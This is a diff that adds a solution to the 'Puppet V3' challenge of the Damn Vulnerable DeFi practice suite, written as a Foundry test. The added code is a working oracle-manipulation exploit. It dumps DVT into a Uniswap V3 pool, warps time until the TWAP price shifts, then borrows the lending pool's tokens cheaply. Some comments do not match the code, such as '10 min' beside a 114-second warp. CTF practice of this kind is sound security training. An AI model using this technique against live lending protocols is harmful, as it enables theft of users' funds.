@@ -10,6 +10,7 @@ import {FixedPointMathLib} from "solmate/utils/FixedPointMathLib.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {INonfungiblePositionManager} from "../../src/puppet-v3/INonfungiblePositionManager.sol";
 import {PuppetV3Pool} from "../../src/puppet-v3/PuppetV3Pool.sol";
+import {ISwapRouter} from "@uniswap/v3-periphery/contracts/interfaces/ISwapRouter.sol";
 
 contract PuppetV3Challenge is Test {
     address deployer = makeAddr("deployer");
@@ -119,7 +120,75 @@ contract PuppetV3Challenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppetV3() public checkSolvedByPlayer {
+        // The idea is take out of the pull as much eth as possibile in order to unbalance the pool
+        // the price will not be immediatly affected but it will be waiting the TWAP period (10 min)
+
+
+        console.log("Player DVT Balance:  ", token.balanceOf(address(player)));
+        console.log("Player WETH Balance: ", weth.balanceOf(address(player)));
+
+        // To do the swap we need the router
+        address SwapRouter =  0xE592427A0AEce92De3Edee1F18E0157C05861564;
+
+        uint256 quote1 = lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE);
+        console.log("Quote before the attack: ", quote1);
+        // 3_000_000.000000000000000000 = 3M eth
+
+        token.approve(SwapRouter, type(uint256).max);
+
+        // Set up ExactOutputSingleParams
+        /*ISwapRouter.ExactOutputSingleParams memory params = ISwapRouter.ExactOutputSingleParams({
+            tokenIn: address(token),
+            tokenOut: address(weth),
+            fee: FEE,
+            recipient: address(player),
+            deadline: block.timestamp, // Set deadline as 10 minutes from now
+            amountOut: 99.99999999999999999e18, // Amount of WETH you want to receive
+            amountInMaximum: PLAYER_INITIAL_TOKEN_BALANCE, // Maximum amount of DVT you're willing to spend
+            sqrtPriceLimitX96: 0 // No price limit
+        });
+
         
+
+        //WETH weth = WETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
+
+        ISwapRouter(SwapRouter).exactOutputSingle(params);*/
+
+        ISwapRouter.ExactInputSingleParams memory params = ISwapRouter.ExactInputSingleParams({
+            tokenIn: address(token),
+            tokenOut: address(weth),
+            fee: FEE,
+            recipient: address(player),
+            deadline: block.timestamp, // Set deadline as 10 minutes from now
+            amountIn: PLAYER_INITIAL_TOKEN_BALANCE,
+            amountOutMinimum: 0,
+            sqrtPriceLimitX96: 0
+        });
+
+        ISwapRouter(SwapRouter).exactInputSingle(params);
+
+        console.log("Quote after attack, but before 10 min: ", lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE));
+        // 3_000_000.000000000000000000 = 3M eth
+
+        vm.warp(block.timestamp + 114); // Aggiungi 10 minuti (600 secondi)
+        vm.roll(block.timestamp + 1);
+
+        console.log("Player DVT Balance:  ", token.balanceOf(address(player)));
+        console.log("Player WETH Balance: ", weth.balanceOf(address(player)));
+
+
+        // Now that price is manipulated and reflected on twap mechanism for price discovery we can borrow
+
+        console.log("Quote after attack, after 10 min: ", lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE));
+        // .143239918968367545
+
+        weth.approve(address(lendingPool), weth.balanceOf(address(player)));
+        lendingPool.borrow(1_000_000e18);
+
+        console.log("DVT balance after borrow: ", token.balanceOf(address(player)));
+        token.transfer(recovery, 1_000_000e18);
+
+
     }
 
     /**
